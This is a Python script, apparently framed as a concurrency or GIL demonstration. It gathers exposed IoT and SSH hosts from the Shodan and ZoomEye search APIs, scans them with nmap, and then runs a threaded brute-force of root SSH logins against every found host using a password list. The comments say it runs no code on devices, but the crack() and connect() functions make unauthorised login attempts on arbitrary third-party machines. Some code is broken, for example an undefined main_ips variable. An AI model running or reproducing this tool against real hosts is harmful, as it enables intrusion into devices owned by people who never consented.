import optparse
from pexpect import pxssh
import time
from threading import Thread, BoundedSemaphore
import requests
import shodan
import nmap
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor

# network based I\O bound operations
# how does pythons GIL limit true parallel execution in order for optimized use of the bytecode
# i try to showcase using time.time()
# does NOT run code on found devices instead just stores information


init(autoreset=True)

# API keys
APIkey = ""
zoomeyekey = ""
api = shodan.Shodan(APIkey)

# Global variables
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)

# Flags
Found = False
Fails = 0

# Shodan API call
def iot(limit=100):
    ips = []
    start = time.time()
    query = 'port:22 OR port:23 OR port:80 OR "webcam"'
    try:
        res = api.search(query, limit=limit)
        ips = [result["ip_str"] for result in res["matches"]]
        print(f"Found {len(ips)} IPs using Shodan.")
    except shodan.APIError as e:
        print(f"Shodan API error: {e}")
    end = time.time()
    print(f"Shodan API took {end - start:.2f} seconds.")
    return ips


# Zoomeye API calls
def zoomeye():
    ips = []
    start = time.time()
    headers = {
        "Authorization": f"Bearer {zoomeyekey}",
    }
    url = "https://api.zoomeye.org/host/search"
    params = {"query": "port:22 OR port:23"}
    try:
        response = requests.get(url, headers=headers, params=params)
        response.raise_for_status()
        data = response.json()
        ips = [result["ip"] for result in data.get("matches", [])]
        print(f"Found {len(ips)} IPs using Zoomeye.")
    except requests.exceptions.RequestException as e:
        print(f"Error in Zoomeye API request: {e}")
    end = time.time()
    print(f" {end - start:.2f} seconds.")

    return ips


# Call NMAP and scan ports
def scan(ips):
    nm = nmap.PortScanner()
    results = {}
    start = time.time()
    for ip in ips:
        try:
            nm.scan(ip, "22,23", arguments="-A -sV")
            results[ip] = []
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        state = nm[host][proto][port]["state"]
                        if state == "open":
                            service = nm[host][proto][port]["name"]
                            version = nm[host][proto][port].get("version", "Unknown")
                            results[ip].append(f"{port}: {service} ({version})")
        except Exception as e:
            print(f"Error scanning {ip}: {e}")
    end = time.time()
    print(f"{end - start:.2f} seconds.")
    return results


# Thread to run NMAP concurrently
def devs(info):
    results = {}
    start = time.time()
    with ThreadPoolExecutor(max_workers=10) as executor:
        output = executor.map(scan, [main_ips])
        for result in output:
            if result:
                results.update(result)
    end = time.time()
    print(f"{end - start:.2f} seconds.")
    return results


# Connect to IoT devices
def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print(f"Password Found: {password} on {host}")
        Found = True
    except Exception as e:
        if "read_nonblocking" in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif "synchronize with original prompt" in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


# Attempt to crack using default creds on port 22
def crack(ips, user, passwdFile):
    global Found
    global Fails
    start = time.time()
    with open(passwdFile, "r") as fn:
        for line in fn.readlines():
            if Found:
                print("Password Found")
                break
            if Fails > 5:
                print(f"Timeouts {Fails}")
                break
            for host in ips:
                connection_lock.acquire()
                password = line.strip("\r").strip("\n")
                print(f"Testing: {password} on {host}")
                t = Thread(target=connect, args=(host, user, password, True))
                t.start()
    end = time.time()
    print(f" {end - start:.2f} seconds.")


# Main function to execute the process
def main():
    start = time.time()
    print(Fore.RED + "Starting Scan\n")
    var1 = iot()
    var2 = zoomeye()

    info = list(set(var1 + var2))

    if info:
        print(f"{len(info)}")

        results = devs(info)

        print("\nresults:")
        for ip, services in results.items():
            if services:
                print(f"{ip}: {', '.join(services)}")
            else:
                print(f"{ip}: No open ports found.")

        crack(info, "root", "password_list.txt")

    else:
        print("could not execute at main")

    end = time.time()
    print(f"{end - start:.2f} seconds.")


if __name__ == "__main__":
    main()
